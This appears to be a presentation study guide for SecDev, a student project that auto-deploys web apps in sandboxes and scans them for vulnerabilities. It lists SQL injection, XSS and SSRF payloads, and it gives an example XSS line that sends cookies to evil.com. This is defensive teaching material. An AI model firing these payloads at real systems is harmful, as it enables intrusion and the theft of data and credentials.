# SecDev — Complete Guide (Viva & Presentation Prep)

> Read this entire file and you'll be able to confidently explain every aspect of SecDev to any judge or interviewer. Everything is explained from scratch — no prior knowledge assumed.

---

## TABLE OF CONTENTS

1. [What is SecDev? (The Big Picture)](#1-what-is-secdev-the-big-picture)
2. [The Problem We're Solving](#2-the-problem-were-solving)
3. [How the User Experiences SecDev (User Flow)](#3-how-the-user-experiences-secdev-user-flow)
4. [The Technology Stack — What Each Tool Does and Why We Picked It](#4-the-technology-stack)
5. [How Route Discovery Works (Crawling the Repo)](#5-how-route-discovery-works)
6. [The 5 Testing Engines — What They Do and How](#6-the-5-testing-engines)
7. [The Security Agent — The Star Feature (Deep Dive)](#7-the-security-agent-deep-dive)
8. [The 6 Security Scanners — How Each Attack Works](#8-the-6-security-scanners-explained)
9. [VibeTesting — Real Browser Testing (Deep Dive)](#9-vibetesting-deep-dive)
10. [The Scoring System](#10-the-scoring-system)
11. [AI Analysis — How and Why We Use AI](#11-ai-analysis)
12. [Sandbox Isolation — How We Keep Things Safe](#12-sandbox-isolation)
13. [Inngest — Why Durable Workflows Matter](#13-inngest-durable-workflows)
14. [Database Design — What Gets Stored](#14-database-design)
15. [Authentication — How Login Works](#15-authentication)
16. [What Makes SecDev Unique (Comparison with Existing Tools)](#16-what-makes-secdev-unique)
17. [How Users Benefit](#17-how-users-benefit)
18. [OWASP Top 10 — What It Is and How We Cover It](#18-owasp-top-10)
19. [Potential Viva Questions with Confident Answers](#19-viva-questions-and-answers)
20. [Key Technical Terms Glossary](#20-glossary)

---

## 1. What is SecDev? (The Big Picture)

SecDev is an **autonomous security testing platform** for web applications.

In simple words: You give it your GitHub repo link. It automatically deploys your app in a safe sandbox, finds all your pages and APIs, attacks them with known hacking techniques, checks for performance problems, tests your UI in a real browser, and then gives you a **security score out of 100** with a detailed report explaining what's wrong and how to fix it.

**The key word is "autonomous"** — meaning it does everything by itself. The user doesn't write any test files, doesn't configure anything, doesn't need to know anything about security. They just click one button.

**Think of it like this:** Imagine taking your car to a mechanic who, with one button press, automatically checks the engine, brakes, tires, lights, suspension, and everything else — then gives you a detailed report with a score and tells you exactly what to fix. That's what SecDev does for web apps.

---

## 2. The Problem We're Solving

### The Hackathon Problem Statement
> "Autonomous Security Systems — Create self-learning or self-adaptive security solutions that reduce human intervention in monitoring, detection, and response."

### Why This Problem Matters

**Problem 1: Web apps get hacked all the time**
- Over 70% of data breaches happen through web application vulnerabilities
- Attackers use automated tools to find and exploit weaknesses
- Most developers don't test for security at all

**Problem 2: Existing security tools need experts**
- Tools like Burp Suite, OWASP ZAP, Acunetix require security expertise
- You need to configure scan policies, define scope, write auth scripts
- You need to interpret raw vulnerability data

**Problem 3: Security testing is expensive**
- Commercial DAST tools cost $10,000 to $100,000 per year
- Hiring a security engineer costs $100K+ salary
- Small teams, startups, and students can't afford either

**Problem 4: It's too slow**
- Manual security audits take days to weeks
- Developers ship code daily; security reviews happen maybe once a quarter
- By the time you find a vulnerability, it's been live for months

### How SecDev Eliminates These Problems
SecDev reduces human intervention to **zero**. The user only provides a GitHub repo URL and clicks "Scan." Everything else — deploying, discovering routes, running attacks, scoring, reporting — is fully automated.

---

## 3. How the User Experiences SecDev (User Flow)

Here's the exact journey a user takes:

### Step 1: Login
- User goes to SecDev's website
- Clicks "Login with GitHub"
- Firebase Auth handles the OAuth flow (user is redirected to GitHub, authorizes the app, gets redirected back)
- NextAuth 5 creates a session with a JWT token

### Step 2: Connect a Repository
- The dashboard shows a list of the user's GitHub repositories (fetched via GitHub API using the OAuth token)
- User selects one

### Step 3: Deploy
- User clicks "Deploy"
- SecDev clones the repo inside an E2B sandbox (Firecracker microVM)
- The app is built (`npm install`, `npm run build`)
- The app is started (`npm start` on port 3000)
- The sandbox URL becomes available

### Step 4: Run Tests
- User sees buttons for different test types: Test Suite, Security Scan, API Tests, Performance Tests, VibeTesting, Security Agent
- User clicks any of them (or Security Agent for the full autonomous pipeline)
- Tests start running — user sees real-time progress on the dashboard

### Step 5: View Results
- Dashboard shows:
  - **Security Score** (0-100)
  - **Vulnerability list** with severity tags (Critical, High, Medium, Low)
  - **Per-route breakdown** (which routes are most vulnerable)
  - **AI-generated analysis** (executive summary, risk level, fix recommendations)
  - **curl commands** to reproduce each vulnerability
  - **Performance metrics** (latency, P95, success rates)
  - **Browser test results** (broken links, JS errors, accessibility issues)

### Step 6: Fix and Re-scan
- Developer reads the report, fixes vulnerabilities in their code
- Pushes to GitHub
- Clicks "Scan" again to verify fixes
- Score improves

---

## 4. The Technology Stack

### Next.js 16 + React 19 (Frontend & API)

**What is Next.js?**
Next.js is a React framework that lets you build both the frontend (what users see) AND the backend (API endpoints) in a single project. It uses a file-based routing system — if you create a file at `app/about/page.tsx`, your app automatically has a `/about` page.

**Why we use it:**
- Single codebase for dashboard UI AND all API routes
- File-based routing makes it easy to organize code
- Server-side rendering for fast page loads
- API Routes (files in `app/api/`) handle backend logic without a separate server

**How it works in SecDev:**
- `app/console/` — Dashboard pages (security results, deployments, settings)
- `app/api/security-agent/run/` — API endpoint to trigger a security scan
- `app/api/deploy/` — API endpoint to deploy a repo to sandbox
- `app/api/tests/` — API endpoints for test results

### E2B Sandboxes (Firecracker microVMs)

**What is E2B?**
E2B (short for "Environment to Binary") is a cloud service that gives you isolated virtual machines (called sandboxes) that spin up in under 1 second. Each sandbox is a Firecracker microVM.

**What is Firecracker?**
Firecracker is the same technology Amazon uses to run AWS Lambda. It creates tiny, lightweight virtual machines that are completely isolated from each other. Think of it like Docker containers but with stronger security — each VM has its own kernel, so even if malicious code runs inside, it can't escape.

**Why we use it:**
- **Security**: We're running untrusted user code and sending attack payloads. We need rock-solid isolation.
- **Safety**: If the attack payloads crash the app, it only affects that sandbox. Other users and the platform itself are unaffected.
- **Speed**: Sandboxes boot in <1 second, much faster than traditional VMs.
- **Per-user isolation**: Every user gets their own sandbox. No shared resources.

**How it works in SecDev:**
1. When user clicks "Deploy," we call the E2B API to create a new sandbox
2. We clone the GitHub repo inside the sandbox
3. We install dependencies and start the app
4. All scanners send requests to `http://localhost:3000` inside the sandbox
5. After tests complete, the sandbox can be kept alive or destroyed

### Inngest (Workflow Engine)

**What is Inngest?**
Inngest is an event-driven workflow engine. It lets you define multi-step processes where each step is independently retryable.

**What does "durable workflow" mean?**
Imagine a 7-step pipeline. In a normal program, if step 5 fails, you'd have to restart from step 1. With Inngest, each step's output is saved (checkpointed). If step 5 fails, Inngest retries ONLY step 5, using the saved output from steps 1-4.

**Why we use it (instead of just running functions in sequence):**
- **Automatic retries**: Network timeout? Sandbox crash? Inngest retries that specific step.
- **No wasted work**: Don't re-deploy the app just because the AI analysis step failed.
- **Durability**: If the server restarts, Inngest picks up where it left off.
- **Observability**: You can see exactly which step each scan is on.

**How it works in SecDev:**
The Security Agent is an Inngest function with 7 steps:
```
Event: "security-agent/run" triggered
  → Step 1: deploy-sandbox (create E2B sandbox, clone repo, start app)
  → Step 2: discover-routes (scan filesystem for pages and APIs)
  → Step 3: plan-tests (decide which scanners to run on which routes)
  → Step 4: run-scanners (execute all 6 security scanners)
  → Step 5: collect-results (gather all findings)
  → Step 6: calculate-score (apply scoring formula)
  → Step 7: ai-analysis (send to Groq for report generation)
```

### Neon PostgreSQL (Database)

**What is Neon?**
Neon is a serverless PostgreSQL service. PostgreSQL is the world's most popular open-source relational database. "Serverless" means you don't manage servers — it scales automatically.

**What we store:**
- `deployments` — sandbox ID, repo URL, status, user ID
- `test_results` — functional test results per route
- `security_results` — security scan findings (vulnerability type, severity, route, evidence)
- `api_test_results` — API test results per endpoint per method
- `performance_results` — latency stats per route
- `vibetest_results` — browser agent findings

### Firebase Auth + NextAuth 5 (Authentication)

**How login works:**
1. User clicks "Login with GitHub"
2. Firebase Auth redirects to GitHub's OAuth page
3. User authorizes SecDev to access their GitHub account
4. GitHub redirects back with an authorization code
5. NextAuth 5 exchanges the code for an access token
6. A session is created (JWT token stored in a cookie)
7. Every API request includes this token — the server verifies it

**Why two auth systems?**
- Firebase handles the identity provider (GitHub OAuth)
- NextAuth 5 handles session management, JWT tokens, and Next.js integration

### Groq / Llama 3.1 8B (AI)

**What is Groq?**
Groq is an AI inference platform that runs open-source LLMs extremely fast — about 500 tokens per second, which is ~10x faster than OpenAI.

**What is Llama 3.1 8B?**
It's Meta's open-source language model with 8 billion parameters. "8B" is the smallest version — fast, cheap, but still capable enough to generate good analysis reports.

**Why we use it only at the final step:**
- All 6 scanners are deterministic (rule-based). They don't use AI.
- Using AI for scanning would be expensive, slow, and unreliable (different results each time).
- We use AI ONLY to take the raw scan results and generate a human-readable report.
- One API call per scan = near-zero cost.

**What the AI generates:**
- Executive summary (2-3 sentences)
- Risk level (Critical / High / Medium / Low / Minimal)
- Critical findings list
- Prioritized fix recommendations
- `curl` commands to replay each attack

**Fallback:** If the GROQ_API_KEY is not set, SecDev generates a deterministic (template-based) analysis instead. The platform works without AI — AI is a bonus, not a dependency.

---

## 5. How Route Discovery Works

This is one of SecDev's key autonomous features. It reads the app's file system to find all routes — no config file needed.

### How it discovers routes:

SecDev uses a **route parser** (`lib/route-parser.ts`) that walks the app's directory structure:

**For Next.js apps (file-based routing):**
- `app/page.tsx` → `/`
- `app/about/page.tsx` → `/about`
- `app/dashboard/settings/page.tsx` → `/dashboard/settings`
- `app/api/users/route.ts` → `/api/users` (API endpoint)
- `app/api/auth/[...nextauth]/route.ts` → `/api/auth/*` (dynamic API)

**What it identifies:**
- **Page routes** — files named `page.tsx` or `page.jsx`
- **API routes** — files named `route.ts` or `route.js` inside `app/api/`
- **Dynamic routes** — folders with `[param]` syntax (like `/users/[id]`)

**Why this matters:**
Traditional security tools require you to manually list all URLs to test, or run a web crawler that might miss API endpoints. SecDev reads the actual source code structure and finds EVERYTHING — including API routes that have no links pointing to them.

---

## 6. The 5 Testing Engines

SecDev runs 5 different types of tests. Here's each one explained simply:

### Engine 1: Test Suite (Functional Testing)

**Purpose:** Check if the app works at all.

**How it works:**
1. Gets the list of all discovered routes
2. Sends an HTTP GET request to each route
3. Checks the response:
   - Does it respond (not timeout)?
   - Is the status code reasonable (200, 301, 302)?
   - Or does it crash (500)?

**What it catches:**
- Routes that return 500 (server errors)
- Routes that don't respond (app crashed)
- Build failures (app didn't start)

**Stored in:** `test_results` table

### Engine 2: Security Scan (Quick OWASP Check)

**Purpose:** A fast, lightweight security check.

**How it works:**
1. Checks HTTP response headers against OWASP recommendations
2. Tests for obvious SQL injection patterns
3. Checks if authentication is enforced on API endpoints

**What it catches:**
- Missing security headers
- Basic injection vulnerabilities
- Unprotected API endpoints

**Stored in:** `security_results` table

### Engine 3: API Testing

**Purpose:** Test every API endpoint thoroughly.

**How it works:**
1. Gets all API routes (anything under `/api/`)
2. For each API route, sends requests with ALL HTTP methods:
   - GET, POST, PUT, DELETE, PATCH
3. Sends malformed request bodies (random junk data)
4. Checks responses:
   - 400 (Bad Request) = Good — the app validated input
   - 500 (Internal Server Error) = Bad — unhandled error, potential security risk
   - 405 (Method Not Allowed) = Good — unsupported methods are properly rejected

**What it catches:**
- APIs that crash on bad input (500 errors)
- APIs that accept all HTTP methods when they shouldn't
- Missing input validation
- Slow endpoints

**Stored in:** `api_test_results` table

### Engine 4: Performance Testing

**Purpose:** Check if the app can handle real-world traffic.

**How it works:**
1. For each route, sends **50 requests** with **10 concurrent connections** (simultaneous)
2. Measures timing for every request
3. Calculates:
   - **Average latency** — typical response time
   - **Min latency** — best case
   - **Max latency** — worst case
   - **P95 latency** — the slowest 5% of requests (this is what real users feel during peak load)
   - **Success rate** — percentage of requests that returned 2xx/3xx (not errors)

**What it catches:**
- Routes that are abnormally slow
- Routes that crash under load
- Database queries that don't scale

**Example output:**
```
Route: /api/users
  Average: 45ms | P95: 120ms | Success: 100%

Route: /api/reports
  Average: 2300ms | P95: 5400ms | Success: 73%  ← PROBLEM!
```

**Stored in:** `performance_results` table

### Engine 5: VibeTesting (Browser Testing)

See [Section 9](#9-vibetesting-deep-dive) for the full deep dive.

---

## 7. The Security Agent (Deep Dive)

The Security Agent is the **main feature** of SecDev. It's a fully autonomous, multi-step security testing pipeline.

### What makes it "autonomous"?

1. **No human configuration** — It figures out what to test by reading the filesystem
2. **Adaptive testing** — Different scan types for pages vs. APIs
3. **Self-contained** — Deploys the app, tests it, scores it, and reports on it
4. **Fault-tolerant** — Retries failed steps automatically

### The 7-Step Pipeline:

**Step 1 — Deploy Sandbox**
- Creates an E2B Firecracker microVM
- Clones the GitHub repo into the sandbox
- Runs `npm install` and `npm run build`
- Starts the app on `localhost:3000`
- Waits for the app to be ready (health check)

**Step 2 — Discover Routes**
- Scans the filesystem inside the sandbox: `find app -name "page.tsx" -o -name "route.ts"`
- Parses paths into route URLs
- Categorizes: page routes vs. API routes

**Step 3 — Plan Tests**
- For API routes: schedule injection scanner, XSS, SSRF, auth bypass, rate limit
- For page routes: schedule headers scanner, rate limit
- For all routes: schedule security headers check

**Step 4 — Run 6 Scanners**
- Executes all 6 scanners against the planned routes
- Each scanner sends its specific payloads and records findings
- All scanners run inside the same sandbox

**Step 5 — Collect Results**
- Gathers all findings from all 6 scanners
- Deduplicates (same vulnerability found by multiple scanners)
- Organizes by route and severity

**Step 6 — Calculate Score**
- Applies the scoring formula
- Calculates per-route scores
- Sorts routes by worst score first

**Step 7 — AI Analysis**
- Sends the full findings to Groq/Llama 3.1
- Gets back: executive summary, risk assessment, fix recommendations, curl replay commands
- Stores everything in the database

---

## 8. The 6 Security Scanners Explained

### Scanner 1: SQL Injection (injection.ts)

**What is SQL Injection?**
When an app takes user input and puts it directly into a database query without sanitizing it. An attacker can manipulate the query to read, modify, or delete data.

**Example of the vulnerability:**
```javascript
// VULNERABLE CODE (what we're trying to detect):
const query = "SELECT * FROM users WHERE name = '" + userInput + "'";

// If userInput is: ' OR '1'='1
// The query becomes: SELECT * FROM users WHERE name = '' OR '1'='1'
// This returns ALL users — data breach!
```

**How our scanner detects it (3 methods):**

**Method 1: Error String Detection**
- We send payloads like `' OR '1'='1` to every API endpoint
- We check if the response body contains SQL error messages:
  - `"sql syntax"`, `"pg_query"`, `"mysql_fetch"`, `"SQLSTATE"`, `"ORA-"`
- If these strings appear, the app is leaking database errors → **Critical vulnerability**

**Method 2: HTTP 500 Detection**
- We send SQL payloads and check if the server returns HTTP 500
- If normal input returns 200 but SQL payload returns 500, the injected SQL likely crashed an unhandled database query
- → **High vulnerability**

**Method 3: Time-Based Detection**
- We send payloads containing `SLEEP(5)` or `WAITFOR DELAY`
- We measure how long the response takes
- If the response takes >4 seconds (normally it's <1 second), the SQL command was actually executed on the database
- → **Critical vulnerability** (proves the SQL was executed)

**Payloads used** (from `payloads/sql.json`):
- `' OR '1'='1`
- `'; DROP TABLE users;--`
- `' UNION SELECT null, username, password FROM users--`
- `'; WAITFOR DELAY '0:0:5'--`
- `1; SELECT SLEEP(5)`

---

### Scanner 2: XSS — Cross-Site Scripting (xss.ts)

**What is XSS?**
When an app takes user input and displays it on a page without escaping it. An attacker can inject JavaScript that runs in other users' browsers — stealing cookies, redirecting to phishing sites, or performing actions as the victim.

**Example:**
```
# Attacker puts this in a comment field:
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

# If the app shows this comment without escaping, every user who sees it
# gets their cookies stolen and sent to the attacker's server.
```

**How our scanner detects it:**

**GET Reflection Test:**
- We send: `GET /search?q=<script>alert(1)</script>`
- We check if `<script>alert(1)</script>` appears in the response HTML unchanged
- If it's there unchanged, it means the app echoes user input without escaping → **Critical**

**POST Reflection Test:**
- We send: `POST /api/comments` with body `{ "input": "<img onerror=alert(1)>" }`
- We check if the payload appears in the response unchanged

**Payloads used** (from `payloads/xss.json`):
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `javascript:alert(1)`
- `<body onload=alert(1)>`
- `"><script>alert(1)</script>`

---

### Scanner 3: SSRF — Server-Side Request Forgery (ssrf.ts)

**What is SSRF?**
When an app fetches a URL that the user provides, but doesn't validate where that URL points. An attacker can make the server fetch internal resources — cloud metadata, internal services, files on the server's filesystem.

**Why is this dangerous?**
Cloud platforms like AWS have a metadata service at `http://169.254.169.254/` that returns sensitive information: API keys, server configurations, IAM credentials. If an attacker can make your app fetch this URL, they can steal your cloud credentials.

**How our scanner detects it:**
- We send internal/metadata URLs as request parameters or JSON body fields
- We check the response for indicators that internal data was returned:
  - AWS metadata: `ami-id`, `instance-id`, `iam`, `access-key`
  - GCP metadata: `computeMetadata`
  - Internal files: `root:x:0` (from `/etc/passwd`)
  - Internal services: Redis `+OK`, Memcached `STAT pid`

**Payloads used** (from `payloads/ssrf.json`):
- `http://169.254.169.254/latest/meta-data/` (AWS metadata)
- `http://metadata.google.internal/computeMetadata/v1/` (GCP metadata)
- `file:///etc/passwd` (local file read)
- `http://localhost:6379/` (Redis)
- `http://127.0.0.1:11211/` (Memcached)
- `http://0.0.0.0/` (localhost bypass)

---

### Scanner 4: Authentication Bypass (auth.ts)

**What is Auth Bypass?**
When protected endpoints (like `/api/admin/users`) can be accessed without proper authentication — either with no token, a fake token, or by exploiting weaknesses in the authentication system.

**How our scanner detects it:**

**Test 1: No authentication at all**
- Send request with no `Authorization` header
- If endpoint returns 200 with data → it's unprotected → **High vulnerability**

**Test 2: Empty authorization**
- Send: `Authorization: ""`
- If endpoint returns 200 → broken auth check → **High**

**Test 3: Fake token**
- Send: `Authorization: "Bearer invalid_token_123"`
- If endpoint returns 200 → token validation is broken → **High**

**Test 4: JWT "none" algorithm bypass**
- JWT tokens look like: `header.payload.signature`
- The header specifies the algorithm: `{"alg": "HS256"}`
- Attack: Send `{"alg": "none"}` — some libraries skip signature verification
- If endpoint returns 200 → **Critical** (famous JWT vulnerability)

**Test 5: Default credentials**
- Try `Basic admin:admin`, `Basic admin:password`, etc.
- If it works → **High**

**Smart filtering:**
- The scanner skips known public routes: `/login`, `/register`, `/health`, `/docs`, `/public`
- Only tests routes that SHOULD be protected

---

### Scanner 5: Security Headers (headers.ts)

**What are security headers?**
HTTP response headers that tell the browser to enforce security policies. Without them, the browser has no protection instructions and the app is more vulnerable to attacks.

**Headers we check:**

| Header | What it does | Severity if missing |
|--------|-------------|-------------------|
| `Content-Security-Policy (CSP)` | Tells the browser which scripts/styles/images are allowed to load. Prevents XSS. | High |
| `Strict-Transport-Security (HSTS)` | Forces HTTPS. Prevents downgrade attacks. | High |
| `X-Frame-Options` | Prevents your page from being embedded in an iframe. Prevents clickjacking. | Medium |
| `X-Content-Type-Options` | Prevents the browser from guessing file types. Prevents MIME-type attacks. | Medium |
| `Referrer-Policy` | Controls how much URL info is sent when navigating away. Privacy protection. | Low |
| `Permissions-Policy` | Controls access to browser features (camera, microphone, geolocation). | Low |

**Additional checks:**
- **Information Disclosure**: If `Server: Apache/2.4.41` or `X-Powered-By: Express` headers exist → attackers know your tech stack → **Medium**
- **Cookie Security**: Cookies missing `HttpOnly` (prevents JS access), `Secure` (HTTPS only), or `SameSite` (prevents CSRF) flags → **High**
- **CORS Misconfiguration**: If `Access-Control-Allow-Origin: *` → any website can make API requests to your server → **Medium**

---

### Scanner 6: Rate Limiting (rate-limit.ts)

**What is rate limiting?**
Limiting how many requests a user can make in a given time period. Without it, attackers can:
- Brute-force passwords (try millions of combinations)
- Launch DoS attacks (overwhelm the server)
- Scrape all your data rapidly

**How our scanner detects it:**
1. Sends **30 requests simultaneously** using `Promise.all()` (all at once, not one by one)
2. Checks if ANY response returns HTTP 429 ("Too Many Requests")
3. Also checks for `Retry-After` header
4. If no 429 is returned → rate limiting is missing → **Medium vulnerability**

**Why this matters:**
A login endpoint without rate limiting means an attacker can try thousands of passwords per second. With rate limiting, they might get 5 attempts per minute.

---

## 9. VibeTesting (Deep Dive)

VibeTesting is SecDev's **real-browser testing engine**. Most security tools only send HTTP requests and read the response. VibeTesting actually opens a browser and tests what a real user would see.

### How it works technically:

1. **Connects to the E2B sandbox** that has the deployed app
2. **Installs Playwright** (or uses the pre-installed version at `/opt/playwright`)
3. **Uploads 4 JavaScript agent scripts** to `/tmp/vt/` inside the sandbox
4. **Runs each agent** sequentially against the app at `http://localhost:3000`
5. Each agent outputs **JSON results** which are parsed and stored in the database

### The 4 Agents:

#### Agent 1: Links Agent
**What it does:** Crawls the website like a search engine bot.
- Starts at the homepage
- Finds all `<a href>` links on the page
- Visits each link (up to 25 pages)
- Checks if each page loads successfully
- Reports broken links (404, 500, timeouts, redirect loops)

**Why it matters:** Broken links are a sign of poor quality and can indicate missing pages or deleted resources.

#### Agent 2: Console Agent
**What it does:** Opens each page and listens for JavaScript errors.
- Monitors `console.error` events
- Monitors `pageerror` events (unhandled exceptions)
- Records the error messages and which page they occurred on

**Why it matters:** JavaScript errors are invisible to HTTP-only testing. A page might return 200 (looks fine from the server) but crash the user's browser with a `TypeError` or `ReferenceError`. This agent catches those.

**Example finding:**
```
Page: /dashboard
Error: TypeError: Cannot read properties of undefined (reading 'map')
→ Severity: Medium (runtime JS crash)
```

#### Agent 3: Accessibility (A11y) Agent
**What it does:** Checks if the website is usable by people with disabilities.
- Images without `alt` text (screen readers can't describe them)
- Buttons without labels (screen readers say "button" but not what it does)
- Form inputs without labels (users don't know what to type)
- Heading hierarchy violations (h1 → h3 skipping h2)
- Missing `lang` attribute on `<html>` (screen readers don't know what language to use)

**Why it matters:** Accessibility is a legal requirement in many jurisdictions (ADA, EU accessibility laws). It's also good practice — 15% of people have some form of disability.

#### Agent 4: UI Agent
**What it does:** Tests the visual layout at two screen sizes.
- **Desktop:** 1280px width
- **Mobile:** 375px width (iPhone SE)

**Checks:**
- Broken images (`<img>` tags that failed to load)
- Missing viewport meta tag (`<meta name="viewport">` — without this, mobile browsers render the page at desktop width)
- Missing `<title>` tag
- Missing favicon
- Horizontal overflow (content breaking out of the viewport on mobile — classic responsive design bug)
- Render-blocking scripts (JavaScript files in `<head>` that delay page rendering)

---

## 10. The Scoring System

### Formula:
```
Score = 100 - (Critical × 15) - (High × 8) - (Medium × 3) - (Low × 1)
```

### What the weights mean:
- Each **Critical** vulnerability costs 15 points (SQL injection, XSS, SSRF, auth bypass)
- Each **High** vulnerability costs 8 points (missing CSP, missing HSTS, insecure cookies)
- Each **Medium** vulnerability costs 3 points (missing X-Frame-Options, info disclosure, CORS *, no rate limit)
- Each **Low** vulnerability costs 1 point (missing Referrer-Policy)

### Score interpretation:
| Score | Meaning |
|-------|---------|
| 90-100 | Excellent — few or no issues |
| 70-89 | Good — minor issues to fix |
| 50-69 | Fair — several security gaps |
| 30-49 | Poor — significant vulnerabilities |
| 0-29 | Critical — urgent fixes needed |

### Per-route scoring:
Each route also gets its own score. The report shows the worst-scoring routes first so developers know exactly which endpoints need attention.

**Example:**
```
Overall Score: 62/100

/api/users      → 25/100 (SQL injection, no auth, no rate limit)
/api/admin      → 40/100 (auth bypass, missing headers)
/about          → 95/100 (only missing Referrer-Policy)
/               → 92/100 (missing CSP)
```

---

## 11. AI Analysis

### What the AI does:
After all 6 scanners complete, the aggregated findings are sent to **Groq's Llama 3.1 8B** model as a single prompt.

### What it generates:

1. **Executive Summary** — 2-3 sentences describing the overall security posture
   > "The application has 3 critical vulnerabilities including SQL injection in the /api/users endpoint. Immediate remediation is required."

2. **Risk Level** — One word: Critical / High / Medium / Low / Minimal

3. **Critical Findings** — The most dangerous issues, explained in plain English

4. **Recommendations** — Prioritized list of fixes:
   > 1. Parameterize SQL queries in /api/users (Critical)
   > 2. Add input sanitization for XSS in /api/comments (Critical)
   > 3. Add Content-Security-Policy header (High)

5. **Attack Replay** — Actual `curl` commands developers can run:
   ```bash
   curl -X POST http://localhost:3000/api/users \
     -H "Content-Type: application/json" \
     -d '{"name": "'\'' OR '\''1'\''='\''1"}'
   ```
   This lets developers verify the vulnerability exists, fix it, and run the command again to confirm it's fixed.

### Why we use AI ONLY here:
- **Scanning must be deterministic.** If we used AI for scanning, results would vary between runs. You couldn't compare before/after.
- **Scanning must be reliable.** AI might miss a vulnerability or hallucinate one. Rule-based scanning is 100% reproducible.
- **Cost efficiency.** 6 scanners × multiple routes × multiple payloads = hundreds of checks. Using AI for each would be expensive. One AI call at the end costs ~$0.001.
- **The AI adds human-readable value.** Raw findings like `"XSS_REFLECTED, HIGH, /api/comments, <script>alert(1)</script>"` aren't helpful for most developers. The AI translates this into plain English with fix steps.

---

## 12. Sandbox Isolation

### Why isolation matters:
We're sending **actual attack payloads** (SQL injection, XSS scripts) to the user's app. If this ran on shared infrastructure:
- One user's tests could crash another user's app
- Attack payloads could hit production systems
- Data could leak between users

### How E2B sandboxes provide isolation:

1. **Hardware-level isolation** — Each sandbox is a Firecracker microVM with its own kernel. Even if code exploits a kernel vulnerability, it can't escape the VM.

2. **Network isolation** — Each sandbox has its own network. Scanners hit `localhost:3000` inside the sandbox, not an external server.

3. **Filesystem isolation** — Each sandbox has its own filesystem. One user can't read another user's code or test results.

4. **Resource limits** — Each sandbox has capped CPU and memory. A crash or infinite loop in one sandbox doesn't affect others.

5. **Ownership verification** — Every API call in SecDev checks that the requesting user owns the sandbox. You can't access someone else's deployment or results.

---

## 13. Inngest (Durable Workflows)

### The problem without Inngest:
```javascript
// Without Inngest — fragile pipeline:
async function runSecurityScan() {
  const sandbox = await deploySandbox();     // 30 seconds
  const routes = await discoverRoutes();      // 5 seconds
  const plan = await planTests();             // 1 second
  const results = await runScanners();        // 60 seconds ← FAILS (network timeout)
  // Everything above is lost. Must restart from scratch.
  const score = await calculateScore();
  const report = await aiAnalysis();
}
```

### The solution with Inngest:
```javascript
// With Inngest — durable pipeline:
inngest.createFunction(
  { id: "security-agent" },
  { event: "security-agent/run" },
  async ({ step }) => {
    const sandbox = await step.run("deploy", () => deploySandbox());
    // ↑ Output saved. If next step fails, this doesn't re-run.

    const routes = await step.run("discover", () => discoverRoutes(sandbox));
    const plan = await step.run("plan", () => planTests(routes));
    const results = await step.run("scan", () => runScanners(plan));
    // ↑ If this fails, Inngest retries ONLY this step.

    const score = await step.run("score", () => calculateScore(results));
    const report = await step.run("analyze", () => aiAnalysis(score));
  }
);
```

### Key benefits:
- **Step-level retries** — Only the failed step retries, not the whole pipeline
- **Checkpointing** — Each step's output is persisted
- **Idempotency** — Safe to retry because each step produces the same output
- **Observability** — Dashboard shows which step each scan is currently on
- **Event-driven** — Scan is triggered by an event, decoupled from the API route

---

## 14. Database Design

SecDev stores all results in **Neon PostgreSQL**. Here are the key tables:

| Table | What it stores |
|-------|---------------|
| `deployments` | Sandbox ID, GitHub repo URL, branch, status (deploying/ready/failed), user ID, timestamps |
| `test_results` | Route path, HTTP status code, response time, pass/fail, deployment ID |
| `security_results` | Vulnerability type, severity, route, evidence (the payload, the response), scanner name, deployment ID |
| `api_test_results` | Endpoint path, HTTP method, status code, response time, request body sent, deployment ID |
| `performance_results` | Route, avg/min/max/P95 latency, success rate, total requests, deployment ID |
| `vibetest_results` | Agent name, finding type, affected page, details, deployment ID |

All tables are scoped by **deployment ID**, which is tied to a **user ID**. This ensures multi-tenant isolation at the database level.

---

## 15. Authentication

### The flow:

```
User clicks "Login"
    ↓
Browser redirects to GitHub OAuth page
    ↓
User authorizes SecDev on GitHub
    ↓
GitHub redirects back with auth code
    ↓
NextAuth exchanges code for access token
    ↓
Firebase creates/finds user record
    ↓
JWT session token stored in browser cookie
    ↓
Every API request sends this cookie
    ↓
Server validates JWT before processing
```

### Why GitHub OAuth?
- Users are developers — they all have GitHub accounts
- We need GitHub access to list their repositories and clone code
- No passwords to manage — GitHub handles authentication

---

## 16. What Makes SecDev Unique

| Feature | Traditional Tools | SecDev |
|---------|------------------|--------|
| **Setup** | Install software, configure scope, write scripts | Zero — connect GitHub, click scan |
| **Configuration** | Select scan policies, define targets, write auth helpers | Auto-discovers everything from filesystem |
| **Test scope** | Security only | 5 categories: security + API + performance + browser + functional |
| **Isolation** | Tests hit live/staging servers | Each test in its own Firecracker microVM |
| **Browser testing** | Separate tool (Selenium/Cypress) | Built-in: 4 Playwright agents |
| **Results** | Raw vulnerability dumps | Scored report + AI summary + curl commands |
| **Failure handling** | Entire scan restarts | Inngest retries only the failed step |
| **Cost** | $10K-100K/year | Free |
| **Expertise needed** | Security professional | None — anyone can use it |

### Specific unique features:

1. **Zero-config autonomy** — No other tool auto-discovers routes from source code AND auto-plans tests
2. **Sandbox isolation** — No other testing platform gives each scan its own microVM
3. **5-dimensional testing** — Most tools do ONE thing (security OR performance OR UI)
4. **Real browser agents** — VibeTesting opens actual Chromium, not just HTTP requests
5. **Deterministic + AI hybrid** — Reliable scanning + human-readable output
6. **Attack replay** — `curl` commands to reproduce every finding

---

## 17. How Users Benefit

### For a solo developer:
- "I don't know anything about security, but SecDev told me my /api/users endpoint has SQL injection and gave me the exact `curl` command to test it. I parameterized my query and re-scanned — score went from 45 to 92."

### For a startup team:
- "We used to skip security testing because we couldn't afford tools or security hires. Now we run SecDev on every PR. Our last real pentest found zero critical issues."

### For a student project:
- "For my college project, SecDev found that my login page had no rate limiting and my API leaked SQL errors. I fixed both and got extra marks for security awareness."

### For compliance:
- "Our SOC 2 auditor asked for evidence of security testing. We showed them SecDev reports with OWASP Top-10 coverage. It satisfied the requirement."

---

## 18. OWASP Top 10

**What is OWASP?**
The Open Web Application Security Project — an international nonprofit that publishes the most widely recognized list of web application security risks.

**What is the OWASP Top 10?**
A list of the 10 most critical web application security risks, updated every few years. It's the industry standard for "minimum security testing."

### How SecDev covers it:

| OWASP ID | Risk | SecDev Scanner |
|----------|------|---------------|
| A01 | Broken Access Control | Auth Bypass scanner — tests endpoints without authentication, with fake tokens, JWT none algorithm |
| A02 | Cryptographic Failures | Headers scanner — checks for HSTS (forces HTTPS), secure cookie flags |
